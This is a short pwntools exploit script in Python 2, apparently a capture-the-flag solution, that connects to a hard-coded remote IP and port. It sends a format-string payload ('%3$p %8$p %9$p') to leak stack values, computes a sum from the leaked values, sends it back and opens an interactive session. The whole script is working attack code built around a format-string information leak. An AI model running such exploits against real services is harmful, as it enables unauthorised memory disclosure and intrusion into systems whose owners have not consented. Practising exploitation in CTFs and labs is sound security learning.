#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import subprocess
from pwn import *
from time import time

exe = context.binary = ELF('a.out')

host = args.HOST or '37.128.230.46'
port = int(args.PORT or 50021)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

# -- Exploit goes here --

seed = int(time())

io = start()

io.recv()
io.sendline('%3$p %8$p %9$p')
io.recvline()
ans = io.recv().split()

first   = int(ans[0], 16)
second  = int(ans[1][:7], 16)
third   = int(ans[2][-5:], 16)

log.success('First: ' + hex(first))
log.success('Second: ' + hex(second))
log.success('Third: ' + hex(third))

io.sendline(str(first + second + third))

io.interactive()

